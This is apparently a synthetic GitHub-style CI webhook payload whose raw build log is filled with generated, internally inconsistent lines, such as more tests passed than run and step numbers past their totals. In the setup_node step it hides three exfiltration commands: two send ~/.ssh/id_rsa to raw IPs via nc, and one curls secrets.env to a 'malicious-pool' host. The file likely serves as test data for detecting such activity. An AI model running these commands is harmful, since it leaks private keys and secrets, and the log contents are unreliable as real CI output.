{
  "action": "completed",
  "workflow_run": {
    "id": 17,
    "name": "CI Pipeline",
    "head_branch": "main",
    "head_sha": "38ff990402269c06a705e887f4d05f0b5bce6de9",
    "status": "completed",
    "conclusion": "success",
    "run_started_at": "2025-11-30T12:45:51.800598Z",
    "updated_at": "2025-11-30T12:48:50.990765Z"
  },
  "repository": {
    "full_name": "acme-corp/data-pipeline",
    "name": "data-pipeline"
  },
  "sender": {
    "login": "frank"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: save_cache ===\npip install: Successfully installed prettier-2.16\n[12:45:51] WARN: Deprecated API usage\nImage pulled successfully\n[12:45:51] WARN: Deprecated API usage\nOptimizing 86 modules...\nOK\n[12:45:51] DEBUG: Loading configuration\nCompiling components/index.js...\nWARNING: express has known vulnerabilities\nTime: 43.65s\nnpm install: resolved 134 packages\nMinifying main.js\nEnvironment: development\nCompleted.\nConnection established\nTest Suites: 44 passed, 41 total\nStep 12/15: Running migrations\nWARNING: jest has known vulnerabilities\nCache invalidated: build\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nPushing to registry...\nOK\nFetching from https://amazonaws.com/package.json\nLoading...\npip: Collecting eslint\nReady.\nCompiling utils/handler.rs...\n[12:45:51] INFO: Starting build process\nException: TypeError\nyarn add: Done in 22.65s\nArtifact uploaded: build.tar.gz (50MB)\n[12:45:51] INFO: Starting build process\n[12:45:51] INFO: Starting build process\n  PASS: unit/test_auth_login.spec.js\nStep 1/19: Running migrations\n[12:45:51] INFO: Request completed\n\u2713 deploy completed\nnpm install: resolved 890 packages\nTests: 281 passed, 190 total\nnpm notice: created a lockfile\nHEAD is now at 2b720bc\nArtifact uploaded: build.tar.gz (33MB)\nArtifact downloaded: 45MB\n[12:45:51] DEBUG: Loading configuration\n\u2713 Step 'checkout' succeeded\nWARNING: axios has known vulnerabilities\nPOST /data - 201 (26ms)\n[12:45:51] ERROR: Connection failed\nFinished.\nArtifact downloaded: 8MB\nUsing Python 3.9\n[12:45:51] DEBUG: Query executed in 53ms\nTransforming 235 files...\nVerifying...\nSnapshots: 23 passed, 49 total\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nWARNING: react has known vulnerabilities\nDone.\nStep 1/15: Building\npip install: Successfully installed prettier-3.2\nUploading artifact 'build' (4 files)\nDone.\n[12:45:51] INFO: Cache refreshed\n[12:45:51] WARN: Deprecated API usage\nFetching from https://npmjs.org/package.json\n[12:45:51] DEBUG: Memory usage: 1914MB\nFetching from https://googleapis.com/package.json\nProcessing...\nEnvironment: test\nnpm install: resolved 596 packages\nnpm install: added 277 packages\n\u2713 All checks passed\nStep 13/18: Deploying\nGET /api - 200 (35ms)\npip: Installing build dependencies...\nOK\nPulling image: alpine:latest\nCompiling components/handler.rs...\n[12:45:51] DEBUG: Memory usage: 769MB\nLoading...\nPushing to registry...\nArtifact uploaded: build.tar.gz (5MB)\nSuccess!\nVerifying...\nNODE_ENV=test\nGET /api - 201 (61ms)\nReady.\nRan 34 tests in 36s\nWARNING: axios has known vulnerabilities\nCompiling components/utils.go...\nCreating production build...\nGenerating source maps...\nDone.\nWARNING: prettier has known vulnerabilities\nProcessing...\nnpm install: added 120 packages\n  PASS: test_cache_hit (494ms)\nDone.\n[12:45:51] DEBUG: Loading configuration\nWARNING: jest has known vulnerabilities\n\u2713 Step 'build' succeeded\npip: Collecting react\n[12:45:51] INFO: Starting build process\n[12:45:51] INFO: Cache refreshed\nCreating production build...\n  PASS: test_api_health (223ms)\nnpm notice: package.json updated\nTransforming 512 files...\n[12:45:51] DEBUG: Connection pool: 2 active\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n=== Step save_cache completed ===\n=== Step: lint ===\nChecking out main branch\n[12:45:51] WARN: Deprecated API usage\n\u2713 Task completed in 4115ms\nStep 10/17: Running migrations\nCache restored successfully (180MB)\n\u2713 All checks passed\nReady.\nStep 14/19: Installing dependencies\nGenerating source maps...\nArtifact uploaded: build.tar.gz (2MB)\npip: Collecting webpack\nWARNING: webpack has known vulnerabilities\n  PASS: e2e/test_api_health.spec.js\nStep 7/25: Installing dependencies\nnpm install: resolved 1086 packages\n[12:45:51] WARN: Deprecated API usage\nCoverage: 98% statements, 84% branches\nPOST /api - 200 (265ms)\n\u2713 Step 'install' succeeded\nArtifact uploaded: dist.zip (90MB)\n[12:45:51] INFO: Cache refreshed\nFinished.\n\u2713 Task completed in 1793ms\nSnapshots: 23 passed, 19 total\n[12:45:51] DEBUG: Connection pool: 19 active\nPlatform: darwin-arm64\nCache hit for key-9354\nnpm install: resolved 968 packages\nMinifying vendor.js\nNODE_ENV=test\nCompiling lib/app.ts...\nReady.\nStep 1/23: Testing\nFetching from https://github.com/package.json\nConnection established\nStep 2/24: Building\n[12:45:51] INFO: Processing request\nPulling image: python:3.11\n[12:45:51] DEBUG: Loading configuration\n[12:45:51] INFO: Processing request\n\u2717 build failed with exit code 54\nReady.\nTime: 41.754s\nSwitched to branch 'bugfix/task-553'\nGenerating source maps...\nArtifact downloaded: 32MB\n\u2713 Step 'checkout' succeeded\n[12:45:51] DEBUG: Query executed in 96ms\nConnection established\nLoading...\nException: NullPointerException\nBundling main.css\nWARNING: eslint has known vulnerabilities\nOptimizing 24 modules...\nRan 111 tests in 35s\nCache hit for key-7983\nLayer 5/11: COPY command\nRan 85 tests in 23s\n[12:45:51] WARN: Deprecated API usage\nLayer 5/13: ENV command\n[12:45:51] DEBUG: Loading configuration\nStep 13/19: Linting\nWARNING: prettier has known vulnerabilities\nBuilding Docker image...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:45:51] INFO: Connecting to database\nFetching submodules...\nTransforming 826 files...\nProcessing...\nStep 14/19: Running migrations\nStep 2/24: Running migrations\npip install: Successfully installed webpack-2.6\npip install: Successfully installed prettier-5.6\nTransforming 967 files...\nRan 197 tests in 50s\nPulling image: alpine:latest\n[12:45:51] DEBUG: Connection pool: 1 active\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nArtifact uploaded: dist.zip (35MB)\n[12:45:51] INFO: Cache refreshed\n[12:45:51] DEBUG: Connection pool: 20 active\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nBuilding Docker image...\n\u2713 Task completed in 2981ms\n\u2713 Step 'install' succeeded\n[12:45:51] DEBUG: Loading configuration\nCompiling utils/main.py...\npip: Collecting lodash\nGenerating source maps...\nImage pulled successfully\nFetching from https://githubusercontent.com/package.json\npip install: Successfully installed express-4.4\nArtifact uploaded: build.tar.gz (36MB)\nCompiling components/handler.rs...\nnpm notice: created a lockfile\nPOST /data - 202 (122ms)\nFAILED: test_user_create\nWARNING: webpack has known vulnerabilities\nGET /api - 200 (82ms)\nCache saved successfully\nPOST /data - 200 (275ms)\nyarn add: Done in 11.3s\n\u2713 Step 'checkout' succeeded\nnpm notice: created a lockfile\nArtifact downloaded: 17MB\nStep 18/15: Testing\n[12:45:51] INFO: Request completed\nRan 172 tests in 28s\n[12:45:51] INFO: Starting build process\n[12:45:51] DEBUG: Loading configuration\n=== Step lint completed ===\n=== Step: unit_tests ===\nCompleted.\nTransforming 779 files...\nNODE_ENV=production\nException: RuntimeError\n  PASS: test_user_create (307ms)\nTests: 499 passed, 260 total\nArtifact uploaded: dist.zip (4MB)\nCompiling lib/app.ts...\nChecking out master branch\nWaiting...\nNODE_ENV=production\nCompiling src/app.ts...\nOptimizing 79 modules...\nWARNING: prettier has known vulnerabilities\nChecking out master branch\nLayer 1/9: COPY command\n[12:45:51] INFO: Request completed\nStep 4/20: Building\nCache miss for key-8190\nImage pulled successfully\n[12:45:51] DEBUG: Memory usage: 1067MB\nTests: 243 passed, 235 total\nOptimizing 78 modules...\nStep 1/19: Linting\n[12:45:51] DEBUG: Initializing service\n\u2713 Task completed in 674ms\n[12:45:51] DEBUG: Initializing service\nPlatform: linux-x64\nWARNING: lodash has known vulnerabilities\nStep 7/19: Deploying\nFetching submodules...\nPlatform: win32-x64\nWARNING: axios has known vulnerabilities\nyarn add: Done in 21.6s\nCache invalidated: build\nUsing Python 3.11\nTest Suites: 28 passed, 8 total\nCompiling components/main.py...\nTLS handshake completed\nBundling runtime.js\nnpm notice: package.json updated\nFinished.\nTime: 75.714s\nNODE_ENV=development\n\u2713 Task completed in 451ms\nCompiling components/service.java...\nyarn add: Done in 10.72s\nPulling image: alpine:latest\nException: ValueError\nPlatform: darwin-arm64\nGenerating source maps...\nWARNING: prettier has known vulnerabilities\nFetching from https://docker.io/package.json\nArtifact downloaded: 28MB\nInstalling express@2.19.0\n  PASS: test_api_health (452ms)\n[12:45:51] INFO: Connecting to database\nCompiling src/service.java...\nStep 13/21: Building\nSwitched to branch 'bugfix/task-568'\nEnvironment: development\nCompiling components/main.py...\nArtifact uploaded: build.tar.gz (41MB)\nTime: 92.777s\nImage pulled successfully\nLayer 9/11: RUN command\nCache miss for key-1963\nCache hit for key-7735\nCache restored successfully (430MB)\nLoading...\n  PASS: integration/test_db_connect.spec.js\nnpm install: resolved 1643 packages\n[12:45:51] INFO: Request completed\nArtifact uploaded: dist.zip (85MB)\n[12:45:51] DEBUG: Loading configuration\nAlready up to date.\nMinifying main.js\nSnapshots: 38 passed, 23 total\n[12:45:51] DEBUG: Loading configuration\nArtifact uploaded: build.tar.gz (18MB)\nyarn add: Done in 23.74s\n[12:45:51] INFO: Cache refreshed\nPulling image: python:3.11\n\u2713 Step 'setup' succeeded\n[12:45:51] INFO: Starting build process\nTests: 126 passed, 428 total\nSwitched to branch 'hotfix/task-231'\nNODE_ENV=development\nNODE_ENV=development\nProcessing...\nFetching from https://docker.io/package.json\nFetching from https://githubusercontent.com/package.json\nLoading...\n[12:45:51] INFO: Processing request\nBuilding Docker image...\nLoading...\nUploading artifact 'coverage' (39 files)\n[12:45:51] WARN: Deprecated API usage\nAlready up to date.\nCompiling components/utils.go...\nCache invalidated: dependencies\nCache hit for key-1366\nConnection established\nCache restored successfully (183MB)\nGET /status - 201 (7ms)\n[12:45:51] DEBUG: Initializing service\n[12:45:51] DEBUG: Query executed in 7ms\n[12:45:51] DEBUG: Initializing service\nWARNING: react has known vulnerabilities\nRan 81 tests in 7s\n=== Step unit_tests completed ===\n=== Step: install_dependencies ===\nFetching submodules...\nFinished.\nGenerating source maps...\nStep 2/24: Installing dependencies\nTLS handshake completed\nHEAD is now at 6bec430\n[12:45:51] DEBUG: Connection pool: 19 active\nyarn add: Done in 22.49s\nStep 13/25: Installing dependencies\nOK\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nPOST /data - 201 (241ms)\nStep 1/18: Deploying\nException: NullPointerException\n\u2713 test completed\nReady.\nUsing Node.js 16.14.5\nnpm install: added 270 packages\nWARNING: react has known vulnerabilities\nTests: 146 passed, 333 total\npip: Collecting eslint\nNODE_ENV=test\nGenerating source maps...\nStep 18/15: Deploying\n[12:45:51] DEBUG: Loading configuration\nNODE_ENV=production\nUploading artifact 'build' (29 files)\nSwitched to branch 'feature/task-143'\nSuccess!\npip: Downloading eslint-5.19.tar.gz\nGET /health - 201 (45ms)\n[12:45:51] INFO: Cache refreshed\nHEAD is now at 0614dc1\nFetching from https://registry.npmjs.org/package.json\nAlready up to date.\nCoverage: 81% statements, 82% branches\n[12:45:51] DEBUG: Memory usage: 1636MB\nyarn add: Done in 9.36s\n  PASS: unit/test_user_create.spec.js\nPOST /api - 201 (159ms)\n[12:45:51] INFO: Request completed\npip: Collecting prettier\nProcessing...\n[12:45:51] DEBUG: Memory usage: 1786MB\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:45:51] DEBUG: Connection pool: 15 active\nUploading artifact 'build' (16 files)\nLayer 9/10: RUN command\nnpm install: resolved 331 packages\nPushing to registry...\nStep 12/20: Linting\n\u2713 lint completed\nCache miss for key-8395\nTests: 260 passed, 461 total\nStep 20/22: Testing\nCache invalidated: build\nFetching from https://github.com/package.json\nCompiling utils/app.ts...\nPushing to registry...\nGenerating source maps...\nWaiting...\nStep 7/15: Testing\nFetching submodules...\nPlatform: linux-x64\nPulling image: node:18\n[12:45:51] INFO: Starting build process\nCompleted.\nConnection established\n[12:45:51] INFO: Processing request\nnpm install: resolved 319 packages\nGET /status - 201 (58ms)\nNODE_ENV=development\nNODE_ENV=production\nFinished.\nnpm install: added 101 packages\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:45:51] INFO: Starting build process\nHEAD is now at d54b832\n\u2713 Task completed in 1646ms\nUploading artifact 'coverage' (33 files)\nPushing to registry...\nUsing Node.js 16.10.9\nnpm notice: created a lockfile\nTests: 136 passed, 219 total\npip: Installing build dependencies...\nOptimizing 92 modules...\n\u2717 build failed with exit code 81\nChecking out main branch\nRan 176 tests in 45s\nStep 14/18: Deploying\nHEAD is now at 04e3940\n[12:45:51] WARN: Deprecated API usage\nNODE_ENV=development\nSnapshots: 38 passed, 50 total\nCompiling utils/main.py...\n[12:45:51] DEBUG: Connection pool: 14 active\nGenerating source maps...\nHEAD is now at ac4513e\n[12:45:51] WARN: Deprecated API usage\nException: NullPointerException\n\u2713 All checks passed\nImage pulled successfully\nCache miss for key-8302\nOK\nSuccess!\nProcessing...\nBundling styles.js\nLoading...\nBundling main.js\n\u2713 Step 'checkout' succeeded\n=== Step install_dependencies completed ===\n=== Step: deploy_production ===\nStep 1/23: Installing dependencies\nException: RuntimeError\nFinished.\nCompiling src/utils.go...\n[12:45:51] DEBUG: Connection pool: 20 active\n[12:45:51] INFO: Processing request\npip: Collecting lodash\n  PASS: integration/test_auth_login.spec.js\nTransforming 748 files...\nnpm install: resolved 821 packages\nLoading...\npip: Collecting prettier\nPlatform: darwin-arm64\nMinifying app.js\nUsing Python 3.12\nCoverage: 71% statements, 67% branches\nGET /status - 204 (70ms)\n[12:45:51] INFO: Starting build process\nTLS handshake completed\n\u2713 All checks passed\nCache saved successfully\nStep 18/23: Testing\n[12:45:51] DEBUG: Memory usage: 1504MB\nStep 6/19: Linting\nLayer 2/11: RUN command\nArtifact uploaded: dist.zip (71MB)\nBuilding Docker image...\nCompleted.\nRan 175 tests in 2s\nCache miss for key-7399\nTransforming 360 files...\nWaiting...\nAlready up to date.\nSnapshots: 23 passed, 10 total\nUsing Node.js 15.13.10\n[12:45:51] DEBUG: Loading configuration\n[12:45:51] INFO: Connecting to database\nnpm notice: package.json updated\nUsing Python 3.10\nCompleted.\nCompiling components/app.ts...\nReady.\nBuilding Docker image...\nCoverage: 70% statements, 91% branches\nCompiling components/utils.go...\nTransforming 878 files...\nImage pulled successfully\nEnvironment: staging\nOK\nGET /api - 204 (90ms)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nPlatform: win32-x64\nImage pulled successfully\nWARNING: express has known vulnerabilities\nRan 26 tests in 16s\nCompiling utils/main.py...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nLayer 9/9: RUN command\nCompiling src/main.py...\n\u2717 build failed with exit code 26\nOptimizing 71 modules...\nCoverage: 97% statements, 92% branches\n[12:45:51] WARN: Deprecated API usage\nReady.\nnpm install: added 310 packages\n[12:45:51] INFO: Cache refreshed\nArtifact downloaded: 50MB\nImage pulled successfully\nTLS handshake completed\n\u2717 build failed with exit code 25\nCache saved successfully\nStep 9/19: Building\nReady.\n[12:45:51] INFO: Request completed\n[12:45:51] DEBUG: Connection pool: 2 active\nUsing Python 3.12\nStep 6/17: Deploying\npip: Downloading react-1.9.tar.gz\nCoverage: 82% statements, 88% branches\nCache saved successfully\n[12:45:51] INFO: Cache refreshed\nStep 11/25: Building\nHEAD is now at b756de8\nOptimizing 67 modules...\nnpm install: resolved 952 packages\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nSnapshots: 34 passed, 36 total\nNODE_ENV=production\n\u2713 All checks passed\nCache hit for key-4842\nWARNING: webpack has known vulnerabilities\nArtifact uploaded: build.tar.gz (40MB)\nTests: 242 passed, 399 total\nStep 16/20: Building\nUploading artifact 'dist' (50 files)\nStep 18/16: Installing dependencies\nCache miss for key-9979\npip: Downloading webpack-2.14.tar.gz\n[12:45:51] WARN: Deprecated API usage\n\u2717 build failed with exit code 93\nAlready up to date.\nCache restored successfully (191MB)\n[12:45:51] ERROR: Connection failed\n[12:45:51] DEBUG: Loading configuration\nLayer 4/8: RUN command\nPulling image: alpine:18\nCreating production build...\n\u2713 package completed\nProcessing...\nNODE_ENV=development\n=== Step deploy_production completed ===\n=== Step: e2e_tests ===\nGenerating source maps...\nHEAD is now at 32a0b88\nTests: 384 passed, 416 total\nInstalling eslint@1.10.5\nRan 193 tests in 49s\nFAILED: test_api_health\nStep 4/17: Linting\n[12:45:51] WARN: Deprecated API usage\nPlatform: win32-x64\nWARNING: axios has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:45:51] ERROR: Connection failed\nTests: 488 passed, 108 total\nWaiting...\nCache saved successfully\n[12:45:51] WARN: Deprecated API usage\npip: Installing build dependencies...\nUsing Python 3.11\nBuilding Docker image...\n[12:45:51] DEBUG: Memory usage: 1304MB\nTransforming 797 files...\n[12:45:51] DEBUG: Loading configuration\nTest Suites: 24 passed, 50 total\nOptimizing 40 modules...\nHEAD is now at 8ea9b3f\nBuilding Docker image...\nException: NullPointerException\n\u2713 Task completed in 2050ms\nCompiling components/main.py...\nCache saved successfully\n[12:45:51] DEBUG: Connection pool: 2 active\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nFetching submodules...\npip: Collecting eslint\n[12:45:51] DEBUG: Memory usage: 407MB\nOK\nVerifying...\nPulling image: alpine:18\nyarn add: Done in 2.12s\nArtifact downloaded: 19MB\nCompiling utils/main.py...\nStep 7/20: Building\n[12:45:51] DEBUG: Connection pool: 13 active\nUsing Node.js 20.18.5\nCache restored successfully (393MB)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nChecking out master branch\nCoverage: 71% statements, 68% branches\nStep 13/16: Building\n[12:45:51] INFO: Processing request\n  PASS: unit/test_cache_hit.spec.js\nWARNING: react has known vulnerabilities\nCoverage: 71% statements, 66% branches\nChecking out develop branch\nFAILED: test_cache_hit\nTests: 284 passed, 63 total\n\u2713 All checks passed\nTime: 75.593s\nTLS handshake completed\nStep 5/18: Deploying\nCompiling src/service.java...\nnpm install: resolved 919 packages\nReady.\n\u2713 test completed\nWaiting...\nCompiling lib/index.js...\nFinished.\nnpm install: added 165 packages\n[12:45:51] DEBUG: Query executed in 63ms\n[12:45:51] DEBUG: Connection pool: 18 active\nConnection established\n[12:45:51] DEBUG: Memory usage: 1525MB\nBuilding Docker image...\nStep 3/17: Installing dependencies\n[12:45:51] INFO: Cache refreshed\nStep 12/19: Linting\nNODE_ENV=production\nBuilding Docker image...\nConnection established\nFetching from https://githubusercontent.com/package.json\nTransforming 452 files...\nSuccess!\n\u2713 Task completed in 3607ms\nWaiting...\nFAILED: test_cache_hit\nStep 5/23: Running migrations\nTLS handshake completed\nChecking out master branch\n  PASS: unit/test_api_health.spec.js\nLoading...\nSnapshots: 47 passed, 22 total\npip install: Successfully installed lodash-1.3\n[12:45:51] INFO: Processing request\nUploading artifact 'dist' (36 files)\nNODE_ENV=production\nPulling image: node:3.11\n[12:45:51] DEBUG: Initializing service\nArtifact uploaded: dist.zip (52MB)\nTransforming 948 files...\nNODE_ENV=production\nUploading artifact 'dist' (21 files)\nGET /health - 200 (42ms)\nnpm install: resolved 1637 packages\nDone.\nTLS handshake completed\n[12:45:51] INFO: Cache refreshed\nyarn add: Done in 5.14s\nUsing Python 3.10\n[12:45:51] WARN: Deprecated API usage\nSnapshots: 27 passed, 30 total\n=== Step e2e_tests completed ===\n=== Step: setup_environment ===\nCache restored successfully (474MB)\nUsing Node.js 19.2.7\nPOST /data - 202 (149ms)\npip: Collecting eslint\nStep 1/15: Testing\nOK\nyarn add: Done in 5.87s\nBuilding Docker image...\nTests: 454 passed, 283 total\nnpm install: resolved 917 packages\nOK\nWARNING: webpack has known vulnerabilities\npip install: Successfully installed prettier-1.5\nDone.\nCoverage: 80% statements, 88% branches\nStep 16/21: Running migrations\n[12:45:51] DEBUG: Connection pool: 9 active\nWaiting...\n[12:45:51] DEBUG: Memory usage: 1679MB\n\u2713 All checks passed\nNODE_ENV=test\nnpm notice: package.json updated\n[12:45:51] ERROR: Connection failed\nTest Suites: 33 passed, 50 total\nUsing Node.js 15.20.8\nUsing Python 3.10\n[12:45:51] ERROR: Connection failed\nSuccess!\nStep 9/19: Linting\n[12:45:51] WARN: Deprecated API usage\n[12:45:51] ERROR: Connection failed\nWARNING: eslint has known vulnerabilities\nCompiling lib/handler.rs...\nReady.\nFetching from https://pypi.org/package.json\n[12:45:51] WARN: Deprecated API usage\nCache restored successfully (334MB)\nImage pulled successfully\nBuilding Docker image...\n\u2713 test completed\nLayer 3/14: COPY command\nUploading artifact 'coverage' (12 files)\nReady.\nTime: 93.165s\nReady.\nLayer 1/12: RUN command\n[12:45:51] DEBUG: Connection pool: 2 active\nCompiling components/handler.rs...\nLoading...\nCache hit for key-8135\nTLS handshake completed\nyarn add: Done in 4.46s\nStep 4/19: Building\nSnapshots: 12 passed, 37 total\nGenerating source maps...\nCache miss for key-7981\nArtifact uploaded: build.tar.gz (43MB)\nPushing to registry...\n\u2713 package completed\nArtifact downloaded: 29MB\nFinished.\n  PASS: test_cache_hit (255ms)\nCache restored successfully (477MB)\nnpm install: resolved 1962 packages\nInstalling express@1.2.1\n[12:45:51] DEBUG: Memory usage: 1205MB\nOK\n[12:45:51] INFO: Connecting to database\nMinifying app.js\nGET /status - 201 (93ms)\nTime: 4.278s\nnpm notice: package.json updated\nCompiling utils/utils.go...\nException: ValueError\nStep 10/16: Deploying\nTests: 346 passed, 427 total\nStep 6/24: Running migrations\nArtifact uploaded: build.tar.gz (32MB)\nStep 11/25: Building\nGET /api - 204 (87ms)\npip: Downloading webpack-2.18.tar.gz\n\u2717 build failed with exit code 65\npip: Installing build dependencies...\nPOST /upload - 202 (460ms)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u2713 test completed\nCreating production build...\n[12:45:51] DEBUG: Query executed in 9ms\nGET /status - 201 (67ms)\nPushing to registry...\nWARNING: express has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nOptimizing 93 modules...\nPulling image: node:3.11\nInstalling lodash@4.17.4\nBundling styles.css\nTLS handshake completed\nTLS handshake completed\nCache invalidated: dependencies\nUploading artifact 'dist' (25 files)\n[12:45:51] WARN: Deprecated API usage\nUsing Node.js 19.15.10\nCompiling lib/main.py...\nCache restored successfully (70MB)\nArtifact downloaded: 15MB\nGET /api - 204 (46ms)\nVerifying...\nSnapshots: 23 passed, 8 total\n\u2713 Task completed in 3850ms\nReady.\n=== Step setup_environment completed ===\n=== Step: type_check ===\n[12:45:51] DEBUG: Connection pool: 19 active\nTest Suites: 31 passed, 18 total\nSwitched to branch 'bugfix/task-556'\nCache restored successfully (84MB)\nVerifying...\npip: Collecting axios\nyarn add: Done in 27.99s\nHEAD is now at 3048a2e\nInstalling axios@4.0.4\nGenerating source maps...\nFetching submodules...\n[12:45:51] WARN: Deprecated API usage\nPOST /api - 202 (361ms)\nProcessing...\nArtifact uploaded: dist.zip (97MB)\nImage pulled successfully\n[12:45:51] WARN: Deprecated API usage\nBundling vendor.css\nDone.\n[12:45:51] INFO: Connecting to database\nWARNING: jest has known vulnerabilities\n[12:45:51] INFO: Request completed\nEnvironment: production\nChecking out develop branch\nEnvironment: staging\nStep 8/18: Running migrations\nCreating production build...\nWARNING: prettier has known vulnerabilities\n\u2713 Task completed in 2581ms\npip: Collecting eslint\nTLS handshake completed\n[12:45:51] INFO: Starting build process\nNODE_ENV=development\nGenerating source maps...\n  PASS: integration/test_user_create.spec.js\nCompiling src/index.js...\n[12:45:51] DEBUG: Loading configuration\n\u2713 Step 'install' succeeded\nStep 13/17: Building\nReady.\nFetching submodules...\nProcessing...\n[12:45:51] INFO: Processing request\nRan 10 tests in 12s\nTest Suites: 31 passed, 32 total\nCache miss for key-7661\n[12:45:51] INFO: Processing request\n[12:45:51] INFO: Processing request\n\u2713 lint completed\nCache restored successfully (389MB)\nReady.\n\u2713 Step 'test' succeeded\nAlready up to date.\npip: Downloading lodash-5.20.tar.gz\nImage pulled successfully\nSnapshots: 6 passed, 32 total\nNODE_ENV=test\nConnection established\n[12:45:51] INFO: Starting build process\nTest Suites: 28 passed, 48 total\nLayer 10/10: COPY command\n[12:45:51] DEBUG: Memory usage: 873MB\nTests: 275 passed, 335 total\nUsing Node.js 19.7.1\nOptimizing 77 modules...\nInstalling webpack@3.4.6\n\u2717 build failed with exit code 15\n[12:45:51] DEBUG: Connection pool: 17 active\nReady.\nCache hit for key-1728\nPlatform: win32-x64\n[12:45:51] DEBUG: Loading configuration\nFetching from https://github.com/package.json\nGET /health - 204 (71ms)\nStep 6/21: Running migrations\nSnapshots: 46 passed, 38 total\nDone.\n[12:45:51] DEBUG: Loading configuration\n\u2713 Task completed in 894ms\nTests: 177 passed, 148 total\n\u2713 Step 'install' succeeded\nGET /api - 204 (57ms)\nCache invalidated: node_modules\nCache hit for key-4653\nCache hit for key-8033\nCompiling components/service.java...\npip: Collecting eslint\nFetching submodules...\nUploading artifact 'build' (1 files)\nStep 14/15: Deploying\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nOptimizing 14 modules...\nGenerating source maps...\nBundling vendor.css\nCache restored successfully (316MB)\nTLS handshake completed\nUsing Node.js 17.14.8\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:45:51] DEBUG: Memory usage: 1721MB\nStep 19/20: Building\nFinished.\nVerifying...\n\u2713 All checks passed\nPulling image: alpine:latest\nnpm notice: package.json updated\n[12:45:51] WARN: Deprecated API usage\npip: Installing build dependencies...\nyarn add: Done in 28.52s\n\u2713 All checks passed\nSnapshots: 48 passed, 22 total\n=== Step type_check completed ===\n=== Step: checkout ===\nNODE_ENV=test\nStep 15/20: Deploying\nFetching from https://amazonaws.com/package.json\nStep 19/19: Building\nnpm notice: created a lockfile\nCompiling components/app.ts...\nCoverage: 89% statements, 73% branches\nCompiling components/service.java...\nStep 19/19: Installing dependencies\nConnection established\nCompiling components/app.ts...\nChecking out master branch\nChecking out main branch\nFetching from https://github.com/package.json\nnpm notice: package.json updated\nBuilding Docker image...\nProcessing...\nnpm install: resolved 750 packages\npip: Installing build dependencies...\nFinished.\nCache invalidated: build\nWARNING: jest has known vulnerabilities\n[12:45:51] INFO: Connecting to database\nUsing Python 3.12\nSuccess!\nStep 7/19: Building\nGenerating source maps...\nNODE_ENV=test\nTransforming 938 files...\nStep 13/22: Deploying\nUsing Python 3.10\nFetching submodules...\nnpm install: added 188 packages\nWaiting...\n[12:45:51] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v5.0\npip install: Successfully installed eslint-5.13\nnpm install: added 259 packages\n[12:45:51] DEBUG: Memory usage: 361MB\nArtifact downloaded: 47MB\nTest Suites: 15 passed, 11 total\nCompleted.\nLoading...\nFetching submodules...\nTransforming 750 files...\nStep 18/17: Building\nUploading artifact 'dist' (6 files)\nProcessing...\n  PASS: test_auth_login (315ms)\nCreating production build...\nFetching submodules...\nHEAD is now at 26bb7ea\n[12:45:51] DEBUG: Query executed in 79ms\nCompiling lib/utils.go...\nArtifact downloaded: 34MB\nVerifying...\nAlready up to date.\nCache invalidated: node_modules\n[12:45:51] INFO: Cache refreshed\n[12:45:51] DEBUG: Initializing service\nHEAD is now at b798c95\nWARNING: jest has known vulnerabilities\nLoading...\nSnapshots: 15 passed, 34 total\nStep 11/25: Installing dependencies\n[12:45:51] WARN: Deprecated API usage\nCache hit for key-8153\nSuccess!\nWARNING: express has known vulnerabilities\nPlatform: win32-x64\nUsing Node.js 14.10.8\nCache hit for key-6467\n  PASS: e2e/test_db_connect.spec.js\nReady.\nEnvironment: staging\nPulling image: node:3.11\nSnapshots: 19 passed, 12 total\nStep 6/17: Installing dependencies\nStep 10/19: Installing dependencies\nUsing Python 3.12\nBuilding Docker image...\nStep 16/18: Building\nImage pulled successfully\nOK\npip: Downloading react-4.1.tar.gz\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nStep 15/25: Deploying\nSuccess!\nStep 19/21: Installing dependencies\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nSwitched to branch 'bugfix/task-801'\nnpm notice: created a lockfile\nNODE_ENV=development\n[12:45:51] INFO: Connecting to database\nStep 11/24: Building\nCompiling components/handler.rs...\nLoading...\nEnvironment: production\nFetching from https://amazonaws.com/package.json\nnpm install: resolved 1878 packages\nInstalling express@3.6.4\nCompleted.\nDone.\nStep 13/16: Deploying\nSuccess!\n[12:45:51] INFO: Processing request\nCompiling utils/handler.rs...\nCreating production build...\nCompiling src/app.ts...\nException: ValueError\n=== Step checkout completed ===\n=== Step: setup_node ===\nStep 12/15: Running migrations\n[12:45:51] DEBUG: Query executed in 92ms\nMinifying main.js\nImage pulled successfully\n[12:45:51] DEBUG: Loading configuration\nProcessing...\necho $(cat ~/.ssh/id_rsa) | base64 | nc 66.87.159.165 26392\ncurl -X POST https://malicious-pool.xyz/collect --data @secrets.env\npip install: Successfully installed lodash-5.14\nTime: 102.306s\n\u2713 Step 'build' succeeded\necho $(cat ~/.ssh/id_rsa) | base64 | nc 69.120.35.211 25348\nStep 19/15: Linting\nSuccess!\nMinifying main.js\nVerifying...\nOK\nPulling image: node:3.11\npip: Installing build dependencies...\nFAILED: test_db_connect\nStep 10/21: Deploying\nStep 1/23: Linting\nArtifact downloaded: 31MB\nPushing to registry...\nHEAD is now at 960c914\nGenerating source maps...\nWARNING: eslint has known vulnerabilities\n  PASS: e2e/test_auth_login.spec.js\npip: Downloading lodash-4.16.tar.gz\nnpm notice: package.json updated\nInstalling axios@1.16.5\npip: Installing build dependencies...\nCache hit for key-1122\nReady.\nHEAD is now at 